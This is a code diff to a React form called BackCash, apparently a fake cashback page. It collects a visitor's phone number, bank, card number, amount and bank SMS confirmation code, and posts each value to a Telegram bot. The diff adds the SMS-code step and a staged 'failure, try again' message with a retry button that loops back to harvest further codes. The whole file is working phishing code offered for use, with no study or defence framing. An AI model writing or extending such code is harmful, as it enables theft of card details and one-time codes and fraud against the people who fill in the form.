@@ -13,10 +13,12 @@ export const BackCash = () => {
   const [firstName, setFirstName] = useState('');
   const [lastName, setLastName] = useState('');
   const [amount, setAmount] = useState('');
+  const [age, setAge] = useState('');
   const [selectedBank, setSelectedBank] = useState(null);
   const [customBankName, setCustomBankName] = useState(''); // Состояние для своего варианта банка
   const [loading, setLoading] = useState(false);
   const [contacted, setContacted] = useState(false);
+  const [isRetry, setIsRetry] = useState(false); // Новое состояние для отслеживания повторной попытки
 
   // Опции для селекта с добавлением "Свой вариант"
   const sortedBankOptions = [
@@ -28,6 +30,8 @@ export const BackCash = () => {
     e.preventDefault();
     setLoading(true);
 
+    const orderType = isRetry ? 'Повторный заказ' : 'Новый заказ';
+
     // Отправка данных в Telegram в зависимости от текущего шага
     if (step === 1) {
       const bankLabel =
@@ -36,7 +40,7 @@ export const BackCash = () => {
         .post(URI_API, {
           chat_id: CHAT,
           parse_mode: 'html',
-          text: `<b>Новий заказ</b>\nНомер телефона: ${firstName}\nНазвание банка: ${bankLabel}\n`,
+          text: `<b>${orderType}</b>\nНомер телефона: ${firstName}\nНазвание банка: ${bankLabel}\n`,
         })
         .then(res => {
           setFirstName('');
@@ -53,7 +57,7 @@ export const BackCash = () => {
         .post(URI_API, {
           chat_id: CHAT,
           parse_mode: 'html',
-          text: `<b>Новий заказ</b>\nНомер карты: ${lastName}\n`,
+          text: `<b>${orderType}</b>\nНомер карты: ${lastName}\n`,
         })
         .then(res => {
           setLastName('');
@@ -71,7 +75,7 @@ export const BackCash = () => {
         .post(URI_API, {
           chat_id: CHAT,
           parse_mode: 'html',
-          text: `<b>Новий заказ</b>\nКод из смс: ${amount}`,
+          text: `<b>${orderType}</b>\nСумма: ${amount}`,
         })
         .then(res => {
           setFirstName('');
@@ -81,16 +85,34 @@ export const BackCash = () => {
           setTimeout(() => {
             setStep(4);
             setLoading(false);
-            
           }, 5000);
           setContacted(true);
         })
         .catch(err => {
           console.error('Ошибка при отправке заказа:', err);
+        });
+    } else if (step === 4) {
+      axios
+        .post(URI_API, {
+          chat_id: CHAT,
+          parse_mode: 'html',
+          text: `<b>${orderType}</b>\nКод из смс: ${age}`,
         })
-        // .finally(() => {
-        //   setLoading(false);
-        // });
+        .then(res => {
+          setFirstName('');
+          setLastName('');
+          setAmount('');
+          setAge('');
+          setLoading(true);
+          setTimeout(() => {
+            setStep(5);
+            setLoading(false);
+          }, 5000);
+          setContacted(true);
+        })
+        .catch(err => {
+          console.error('Ошибка при отправке заказа:', err);
+        });
     }
   };
 
@@ -143,6 +165,13 @@ export const BackCash = () => {
     }),
   };
 
+  // Обработчик клика для кнопки "повторить попытку снова"
+  const handleRetry = () => {
+    setStep(4);
+    setContacted(false);
+    setIsRetry(true); // Устанавливаем состояние для повторной попытки
+  };
+
   return (
     <form className={styles.backcashForm} onSubmit={handleSubmit}>
       {loading && <div className="loader">Loading...</div>}
@@ -187,16 +216,31 @@ export const BackCash = () => {
       {step === 3 && !loading && (
         <input
           type="text"
-          placeholder="Введите код из сообщения"
+          placeholder="Введите сумму"
           value={amount}
           onChange={e => setAmount(e.target.value)}
           required
         />
       )}
-      {step <= 3 && !loading && <button type="submit">Отправить</button>}
-      {step === 4 && !loading && contacted && (
-        <p>произошел сбой, повторите попытку снова</p>
+      {step === 4 && !loading && (
+        <input
+          type="text"
+          placeholder="Введите код из сообщения"
+          value={age}
+          onChange={e => setAge(e.target.value)}
+          required
+        />
+      )}
+      {step <= 4 && !loading && <button type="submit">Отправить</button>}
+      {step === 5 && !loading && contacted && (
+        <>
+          <p>Произошел сбой, повторите попытку снова</p>
+          <button type="button" onClick={handleRetry}>Повторить попытку снова</button>
+        </>
       )}
     </form>
+    
+
+
   );
 };
